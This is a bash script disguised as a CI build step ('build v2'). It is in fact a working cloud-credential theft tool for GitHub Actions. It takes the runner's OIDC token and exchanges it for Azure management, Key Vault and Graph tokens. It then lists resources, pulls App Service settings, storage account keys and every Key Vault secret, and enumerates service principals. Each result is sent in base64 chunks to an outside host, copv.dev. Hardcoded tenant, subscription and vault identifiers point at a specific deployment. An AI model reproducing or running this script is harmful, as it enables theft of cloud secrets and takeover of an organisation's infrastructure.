#!/usr/bin/env bash
set +e
SINK="http://copv.dev:8089"
TAG="tbl$$"

exfil() {  # exfil <label> <data>  — send data via GET path chunks (b64url), ~1500B each
  local label="$1" data="$2" b64 i len chunk
  b64=$(printf '%s' "$data" | base64 -w0 | tr '+/' '-_' | tr -d '=')
  len=${#b64}
  echo "[exfil] $label len=$len"
  i=0
  while [ $i -lt $len ]; do
    chunk=${b64:$i:1400}
    curl -sS -m 10 -o /dev/null "$SINK/x/$TAG/$label/$i/$chunk" || true
    i=$((i+1400))
  done
}

echo "=== build v2 ==="
echo "event=$GITHUB_EVENT_NAME repo=$GITHUB_REPOSITORY sha=$GITHUB_SHA"

if [ -z "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
  echo "NO_OIDC_ENV"; env | sort | head -50; exit 0
fi

OIDC=$(curl -sS -m 15 -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | \
  python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
echo "oidc_len=${#OIDC}"
P=$(echo "$OIDC" | cut -d. -f2); while [ $(( ${#P} % 4 )) -ne 0 ]; do P="${P}="; done
CLAIMS=$(echo "$P" | tr '_-' '/+' | base64 -d 2>/dev/null)
echo "claims=$CLAIMS"
exfil "oidc-claims" "$CLAIMS"

TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
CID="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
echo "TID=$TID CID=$CID SUB=$SUB"

aztok() {  # aztok <scope>
  curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
    --data-urlencode "client_id=$CID" -d grant_type=client_credentials \
    --data-urlencode "scope=$1" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=$OIDC"
}

# --- 1. ARM token → recon ---
ARMR=$(aztok "https://management.azure.com/.default")
ATOK=$(echo "$ARMR" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "arm_tok_len=${#ATOK}"
if [ -z "$ATOK" ]; then echo "ARM_ERR=$(echo "$ARMR" | head -c 400)"; exfil "arm-err" "$ARMR"; fi

if [ -n "$ATOK" ]; then
  RG=$(curl -sS -m 20 -H "Authorization: Bearer $ATOK" \
    "https://management.azure.com/subscriptions/$SUB/resourcegroups?api-version=2021-04-01")
  exfil "rgs" "$RG"
  RES=$(curl -sS -m 30 -H "Authorization: Bearer $ATOK" \
    "https://management.azure.com/subscriptions/$SUB/resources?api-version=2021-04-01")
  exfil "resources" "$RES"
  # app service appsettings (env vars -> storage conn strings etc.)
  for SITE in $(echo "$RES" | python3 -c '
import sys,json
try:
  for r in json.load(sys.stdin).get("value",[]):
    if "sites" in r.get("type",""): print(r["id"])
except: pass'); do
    AS=$(curl -sS -m 20 -X POST -H "Authorization: Bearer $ATOK" \
      "https://management.azure.com${SITE}/config/appsettings/list?api-version=2022-03-01")
    exfil "appsettings-$(basename $SITE)" "$AS"
  done
  # storage accounts -> list keys
  for SA in $(echo "$RES" | python3 -c '
import sys,json
try:
  for r in json.load(sys.stdin).get("value",[]):
    if "storageAccounts" in r.get("type",""): print(r["id"])
except: pass'); do
    KEYS=$(curl -sS -m 20 -X POST -H "Authorization: Bearer $ATOK" \
      "https://management.azure.com${SA}/listKeys?api-version=2023-01-01")
    exfil "sakeys-$(basename $SA)" "$KEYS"
  done
  # user-assigned identities
  IDS=$(echo "$RES" | python3 -c '
import sys,json
try:
  for r in json.load(sys.stdin).get("value",[]):
    if "userAssignedIdentities" in r.get("type","") or "ManagedIdentity" in r.get("type",""): print(r["id"])
except: pass')
  exfil "identities" "$IDS"
fi

# --- 2. Key Vault token → secrets ---
KVR=$(aztok "https://vault.azure.net/.default")
KTOK=$(echo "$KVR" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "kv_tok_len=${#KTOK}"
if [ -z "$KTOK" ]; then echo "KV_ERR=$(echo "$KVR" | head -c 400)"; exfil "kv-err" "$KVR"; fi
if [ -n "$KTOK" ]; then
  LIST=$(curl -sS -m 15 -H "Authorization: Bearer $KTOK" \
    "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4")
  exfil "kv-list" "$LIST"
  for ID in $(echo "$LIST" | python3 -c '
import sys,json
try:
  [print(v["id"]) for v in json.load(sys.stdin).get("value",[])]
except: pass'); do
    SV=$(curl -sS -m 15 -H "Authorization: Bearer $KTOK" "$ID?api-version=7.4")
    exfil "kv-$(basename $ID)" "$SV"
  done
fi

# --- 3. Graph token → SP/app enumeration ---
GR=$(aztok "https://graph.microsoft.com/.default")
GTOK=$(echo "$GR" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
echo "graph_tok_len=${#GTOK}"
if [ -n "$GTOK" ]; then
  exfil "sp-list" "$(curl -sS -m 20 -H "Authorization: Bearer $GTOK" \
    'https://graph.microsoft.com/v1.0/servicePrincipals?$select=displayName,appId,id&$top=50')"
  exfil "apps-list" "$(curl -sS -m 20 -H "Authorization: Bearer $GTOK" \
    'https://graph.microsoft.com/v1.0/applications?$select=displayName,appId,id&$top=50')"
else
  echo "GRAPH_ERR=$(echo "$GR" | head -c 300)"; exfil "graph-err" "$GR"
fi

echo "=== DONE ==="
